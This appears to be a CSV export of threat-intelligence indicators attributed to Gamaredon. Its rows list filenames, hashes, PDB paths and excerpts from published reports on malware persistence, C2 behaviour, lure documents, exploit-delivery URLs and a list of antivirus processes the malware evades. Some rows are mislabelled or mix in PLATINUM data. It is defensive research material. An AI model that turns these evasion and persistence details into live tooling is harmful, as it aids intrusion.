1.0.0,actor--gamaredon,artifact--sha256:89173fb234c283a867186b13d6f95b7f737efcc3c8214015e95742a98c68d78f,observation--sha256:658f521ac584a7a4a185ec6153104204def3710ff92d98c6d1fc892d266387ff,command,• PteroLNK PowerShell version (discontinued in,• PteroLNK PowerShell version (discontinued in,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances TOOLSET In 2025, Gamaredon developed six new custom tools, but also continued using and updating many of its tools that we described in our two previous white papers, which detailed the group’s activities in 2 022– 2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell and VBScript : all Gamaredon tools mentioned in this white paper are written in one of these programming",
1.0.0,actor--gamaredon,artifact--sha256:2abf180087b78893aee45d71d5ff4445823cbfdf32ffd5318be77cd517948c76,observation--sha256:70af1ed06d653ff8c90f76d71194851df55f4124e8db5d3e370017c20d1ec2c2,command,"● Implement email securitysolutionscapableof inspectingandblockingHTMLsmugglingtechniques, particularlyattachmentswithembeddedJavaScript. Configureemail gatewaystoflagfileswithsuspiciousHTMLonerroror onmousemoveevents, whicharecommonlyusedforevasion.● Deployapplicationcontrol policiestorestrict theexecutionof mshta.exeandblockuntrusted.lnkfilesfromrunning. Endpoint DetectionandResponseEDR solutionsshouldmonitormshta.exeactivityandgeneratealertsfor unusual command-lineparametersassociatedwithexternal downloads.● EstablishnetworkmonitoringrulestoflagandreviewtraffictoTryCloudflaresubdomains, astheseareincreasinglyleveragedmaliciousactivities.● EnableDoHtrafficloggingandimplement monitoringpoliciestodetect unauthorizedDoHconnections, astheseareusedbyGammaLoadtoresolveC2domainswhenDNSfails.","● Implement email securitysolutionscapableof inspectingandblockingHTMLsmugglingtechniques, particularlyattachmentswithembeddedJavaScript. Configureemail gatewaystoflagfileswithsuspiciousHTMLonerroror onmousemoveevents, whicharecommonlyusedforevasion.● Deployapplicationcontrol policiestorestrict theexecutionof mshta.exeandblockuntrusted.lnkfilesfromrunning. Endpoint DetectionandResponseEDR solutionsshouldmonitormshta.exeactivityandgeneratealertsfor unusual command-lineparametersassociatedwithexternal downloads.● EstablishnetworkmonitoringrulestoflagandreviewtraffictoTryCloudflaresubdomains, astheseareincreasinglyleveragedmaliciousactivities.● EnableDoHtrafficloggingandimplement monitoringpoliciestodetect unauthorizedDoHconnections, astheseareusedbyGammaLoadtoresolveC2domainswhenDNSfails",candidate,,unknown,unknown,not-stated,,source--gamaredon--56ce9c37d34fb725,Gamaredon/BlueAlpha Abuses Cloudflare Tunneling Service for GammaDrop Staging Infrastructure.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS Figure12FunctionresponsibleforC2IPaddressresolutionofGammaLoadembeddedin93aa6cd0787193b4ba5ba6367122dee846c5d18ad77919b261c15ff583b0ca17(Source:RecordedFuture) Uponsuccessful resolutionof theC2IPaddress, GammaLoadwill writetheIPaddresstothe.DICfilefor useinthenext C2beacon, limitingDNSresolutionstoonlywhentheC2addresshaschanged. Mitigations ● Implement email securitysolutionscapableof inspectingandblockingHTMLsmugglingtechniques, particularlyattachmentswithembeddedJavaScript",
1.0.0,actor--gamaredon,artifact--sha256:7ef96edfcd4d1bdf5f01dc9f39f807a88108732316f0ce40b6a873f9e8f3b32d,observation--sha256:1814282d5d099bc43d5a08d7e2c98bb9f02168317ef0cbb882a2d2736abb0738,file-name,090721.pdb,090721.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 payload, pauses for a few seconds, and deletes all three files: the dropper, itself, and the VBScript payload. Throughout PteroCDrop’s lifetime, Gamaredon has used various compilers to build it and in some of the samples this PDB path was left: E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb Overall, the most prevalent payload delivered by PteroCDrop is a VBScript version of PteroLNK. During 2023",
1.0.0,actor--gamaredon,artifact--sha256:99c519bfb59cffcade68406603d51c6858435d432066297bf492775b1ff8e786,observation--sha256:5f84435d73ecf24e4214ff898b649a4d3906d0257f1a659065904adef1b2803d,file-name,1.exe,1.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"23 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 15. The function in PteroBox that obtains a Dropbox token (redacted) Rclone variant On April 21st, 2025, we discovered a variant of PteroBox that uses rclone , instead of the Dropbox API, to upload files to Dropbox. This variant downloads the rclone utility from a hardcoded Gamaredon C&C server, storing it in %APPDATA% \rclone \ as rclone.exe or 1.exe. It then drops an embedded rclone configuration file ( %AP",
1.0.0,actor--gamaredon,artifact--sha256:99c519bfb59cffcade68406603d51c6858435d432066297bf492775b1ff8e786,observation--sha256:8acee544af1ad399c22263257af1d80dd75f21aac2c0e9e7a4cab3201336174d,file-name,1.exe,1.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"41 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %TEMP% \1.exe APPENDIX C: HOST-BASED ARTIFACTS ASSOCIATED WITH THE SECOND VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000001.regtrans -ms %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000002.regtrans -ms %PUBLIC% \ntuser.ini:SRV %PUBLIC% \ntuser.ini:LNK %USERPROFILE% \boot.ini:SRV %USERPROFILE% \boot.ini:LNK %USERPROFILE% \boot.ini:G",
1.0.0,actor--gamaredon,artifact--sha256:99c519bfb59cffcade68406603d51c6858435d432066297bf492775b1ff8e786,observation--sha256:453af6348565ae39fc5a2cf21a9010c0954541ecc637589a80934de03f5b8667,file-name,1.exe,1.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:4eb8d31b17b20305ff0f12cf360853a05a2fee31d4b60c115c3b1d10d0e669a0,observation--sha256:cd38b860f3e39fb57bfa10b36a4699e4201e04c67f2f8166f76d3d24e08e75b7,file-name,2011.doc,2011.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Lure documents are typically given topical names that may be of interest to the recipient. Such lures often address controversial subjects or offer provocative opinions, in an effort to incite the reader into opening them. Figure 3 shows a sample of such titles. Figure 3. Example document titles used by PLATINUM to deliver exploits SHA1 Filename e9f900b5d01320ccd4990fd322a459d709d43e4b Gambar gambar Rumah Gay Didiet Prabowo di Sentul Bogor.doc 9a4e82ba371cd2fedea0b889c879daee7a01e1b1 The real re",
1.0.0,actor--gamaredon,artifact--sha256:b68978c162bf601be45cc5d7901a303250d0d35f755d1addbe2643d8e3feeba2,observation--sha256:a727d3d98f85c7e5bcfd6aed0fa82a362b245d1a07b4b1a7eb0e82fce3f5f70a,file-name,2025.lnk,2025.lnk,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"44 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktoph %APPDATA% \{ConnectedDevicesPlatform|Windows|Explorer }\desktopr %APPDATA% \Logs\[a-zA-Z0-9]+ Scheduled task names MicrosoftEdgeUpdateTaskMachineUA MicrosoftEdgeUpdateTaskMachineCore MicrosoftUpdateTaskMachineUA MicrosoftUpdateTaskMachineCore Filenames для службового користування.lnk Прибуття.lnk Вибуття.lnk ФОТО.lnk Акти.lnk ЖБД.lnk Доповід",
1.0.0,actor--gamaredon,artifact--sha256:d634f2cb6c74793b15dca541d00a2cd1757ebaad991de3c755956898373172ab,observation--sha256:388b50e07f15c4f0b579135b6427605d8d4ce69739b8be12b0f533819069eeba,file-name,360tray.exe,360tray.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:3797473fe60bce15042b796101f3af89b5eee08501402fd79eb737708584cea5,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"17 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 12. PteroCache (prettified) Capabilities Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the Gamaredon tools. Some instances we observed were able to deploy an unlimited number of payloads, while some could deploy only up to 10 payloads. Network protocol For communication with its C&C server, PteroCache uses an HTTP GET request with the HTTP header x - cache, in whic",
1.0.0,actor--gamaredon,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:cc1ef6f13b3df0bde9f2d27df7e3350de553a04f0bf09765cd1f67b7f9781d03,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:9725dc59d7181533df7e28632f151c30239d7f12126fb39f867755d6699f86e4,observation--sha256:f852b07755d975ad9ae927d97c7f9861ef8249b5d921a2d9f95dfed07fdf8e6c,file-name,7za.exe,7za.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"17 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 12. PteroCache (prettified) Capabilities Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the Gamaredon tools. Some instances we observed were able to deploy an unlimited number of payloads, while some could deploy only up to 10 payloads. Network protocol For communication with its C&C server, PteroCache uses an HTTP GET request with the HTTP header x - cache, in whic",
1.0.0,actor--gamaredon,artifact--sha256:9725dc59d7181533df7e28632f151c30239d7f12126fb39f867755d6699f86e4,observation--sha256:616a8957538fcae6d0719c8c963fd8de3f23d6fcf0ff2af47308e6b668af8d2d,file-name,7za.exe,7za.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:51025a8b06109ef909085412843d23b72528fc2c10563cb7e690557046b71fda,observation--sha256:f5d210f19dd1b7772d58aa5d8315271712d917d2a150620dba0afa0e29f6e858,file-name,Bogor.doc,Bogor.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Lure documents are typically given topical names that may be of interest to the recipient. Such lures often address controversial subjects or offer provocative opinions, in an effort to incite the reader into opening them. Figure 3 shows a sample of such titles. Figure 3. Example document titles used by PLATINUM to deliver exploits SHA1 Filename e9f900b5d01320ccd4990fd322a459d709d43e4b Gambar gambar Rumah Gay Didiet Prabowo di Sentul Bogor.doc 9a4e82ba371cd2fedea0b889c879daee7a01e1b1 The real re",
1.0.0,actor--gamaredon,artifact--sha256:1d22a4e1473dbd090b795b5085c4651a099af9626bb87e6f3e0a9c90288874ab,observation--sha256:49c50493e73681bc1606215f4b650a1d6a92c9a333d81c364f8ed8b2494f7521,file-name,ChkFlsh.exe,ChkFlsh.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 4. UltraVNC The group was also looking for software with the ability to identify and retrieve data from removable data storages , as well as isolated (not connected to the Internet) information systems. From 2014 to 2016 it is known about the usage of the file ChkFlsh.exe (mikelab.kiev.ua). At the same time , the main tool of the hacker group Armageddon from 2016 has been malicious software Pterodo, which actually allowed to solve key issues of deployment in the targeted system, securing ",
1.0.0,actor--gamaredon,artifact--sha256:dedbabe129f6e4f49a2e2cf6dee1da165d18dcefe6db43af182703861aa109be,observation--sha256:ec431429c44c63c872d253a07f877c406d3ba9e6a08d02c884f49b1f8f97af9c,file-name,Defrag.exe,Defrag.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:24c1d845c587cfc9b6a3c6af2cd5887f13bb218eb07293a46e752990bc786fb4,observation--sha256:14a9296ade2dbb67f8a0d1b0d58836b253a829207febda6dcdd5bf0d34a0564b,file-name,Devices.doc,Devices.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:04884a854d42b76359b181b5b5cc6868cae27debd43a985c80ca00f128a0e108,observation--sha256:ed8d14ac9515b6b663b6f3afba3cd733f4201701823bb6560a111099dbbb3ac6,file-name,II.doc,II.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:5dfe7cc76dc8c6d9fbad38da25cc30f3b444f71f2ee2c62df1d76cc488a35301,observation--sha256:a1f7a58eefb1a05a375739835e9c062abf93b20d1e01be6ce267ea2c13c8970d,file-name,Indonesia.doc,Indonesia.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:56be5dfa96c2cbd24949aef899f376815eb27047da154987027e721f5a688a04,observation--sha256:7fb4f4484247277aef8036b75de93536d3635c280a50e4c63922df9b28d90037,file-name,LocalSMS.dll,LocalSMS.dll,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The virus provides the following actions: the virus copies its files to the operating system startup folders %APPDATA%\Microsoft\Windows\Start and Menu\Programs\Startup, and registers itself in the task scheduler (Figure 6) in order to wait for action from the command & control server (C2). In earlier versions, command & control servers were hard - coded, but from 2019 the SSU noticed additional configuration files with backup С2 list. Figure 6. An example which demonstrate unauthorized schedule",
1.0.0,actor--gamaredon,artifact--sha256:30880b30c8882d661ef86e4dc357f701a0776bef3dec8cc12e99f8416126ef93,observation--sha256:c88fcb5f9bcfb8863986f0f03600158806f84818e12e1cabb586839f83178e77,file-name,Mao_2011.doc,Mao_2011.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:bc73263de9e3800e3147837e0f96cc8aa5c21e4b0d17ea564790ee90b84b7f7a,observation--sha256:01ecd72355513675d9b29a8ae24e9ad6e31cfa65bdb30b45b2d606c5911784ec,file-name,MpOav.dll,MpOav.dll,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 ° OS version, ° original install date, ° system boot time, ° system type, ° system directory, ° logon server, ° domain, ° total physical memory, and ° available physical memory. · used and free space of all connected drives, · a list of running processes, · a list of installed applications enumerated from two registry keys: ° HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\ , and ° HKCU\So",
1.0.0,actor--gamaredon,artifact--sha256:7f0ab6ccc3fa4a1439953c11750e8bf5abfabbc9b7df71ea986d0fc400db3577,observation--sha256:e6aafa90a552132ebcc6bb8ece9ce41761f9fafe7362a497f5dbdbe6e605c407,file-name,NTUSER.DAT,NTUSER.DAT,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"41 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %TEMP% \1.exe APPENDIX C: HOST-BASED ARTIFACTS ASSOCIATED WITH THE SECOND VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000001.regtrans -ms %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000002.regtrans -ms %PUBLIC% \ntuser.ini:SRV %PUBLIC% \ntuser.ini:LNK %USERPROFILE% \boot.ini:SRV %USERPROFILE% \boot.ini:LNK %USERPROFILE% \boot.ini:G",
1.0.0,actor--gamaredon,artifact--sha256:dc5ee8fc4ec50888a577e01ed2bb92bf4bd1145aec50dc121c28d282b1165ebd,observation--sha256:ee0c4f0af727c2d86df2d93a4160d713f6cddec6d19e6f93fe5404797bdc8c15,file-name,Office.docx,Office.docx,candidate,,unknown,unknown,not-stated,,source--gamaredon--56ce9c37d34fb725,Gamaredon/BlueAlpha Abuses Cloudflare Tunneling Service for GammaDrop Staging Infrastructure.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS Figure9DeobfuscatedGammaDroppayload93aa6cd0787193b4ba5ba6367122dee846c5d18ad77919b261c15ff583b0ca17Source:RecordedFuture) GammaDropwill writeGammaLoadtodiskinthedirectory%USERPROFILE%andexecuteit usingawscript.execommand. GammaDropwill set persistencefor GammaLoadusingarunkeyonlyif theprocessQHActiveDefense.exeisnot running, aprocessnamelikelyassociatedwiththe360TotalSecurityendpointagent.GammaDropalsowritesanIPaddresstoa.DICfilein%APPDATA%thatGammaLoadleveragesfor C2initsi",
1.0.0,actor--gamaredon,artifact--sha256:500e35f95ffa9b4f3220aa8c6aff5fd117791cff57537082fd0c78baea4dbcf1,observation--sha256:2842c57d5a32a8808bf90f3380970df57fcb8d8608532a15efb1a284213f1f84,file-name,Pk2.exe,Pk2.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"A second Dipsind variant registers as a Winlogon Event Notify DLL. This backdoor contains a minimized feature list from the original Dipsind variant, and supports a more limited number of commands. It sets the following registry keys in the HKEY_LOCAL_MACHINE hive for persistence and functionality: • SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\Asynchronous • SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\DllName • SOFTWARE\Microsoft\Windows NT\Cur",
1.0.0,actor--gamaredon,artifact--sha256:ed20c670d5e7dbac18886b10448d3062c2fa8c265922b3f61dcfe1cb9384795f,observation--sha256:c3425402caa7a838c88fe06fa2e464046fabe52893cd3f85086450dcb4d7cc5e,file-name,President.doc,President.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Lure documents are typically given topical names that may be of interest to the recipient. Such lures often address controversial subjects or offer provocative opinions, in an effort to incite the reader into opening them. Figure 3 shows a sample of such titles. Figure 3. Example document titles used by PLATINUM to deliver exploits SHA1 Filename e9f900b5d01320ccd4990fd322a459d709d43e4b Gambar gambar Rumah Gay Didiet Prabowo di Sentul Bogor.doc 9a4e82ba371cd2fedea0b889c879daee7a01e1b1 The real re",
1.0.0,actor--gamaredon,artifact--sha256:c5be75ae1907e00d8814ed4d06cd4aa87dcecfdc8dc97e0975aaa577b326c2a0,observation--sha256:4089592e9d78cb91406c2f6c84247f8c5f9568ce3533b06fec6c5acdca7cb322,file-name,Resume.docx,Resume.docx,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:a95159e0ace73b8a1d7f73cccc32933571ec60e6ad1b910a03c65a1dec518d43,observation--sha256:c7b7846873dbce60a00593238469daa6fc32b57d8f4ca283f1508a9f1e971802,file-name,Reverse.pdb,Reverse.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
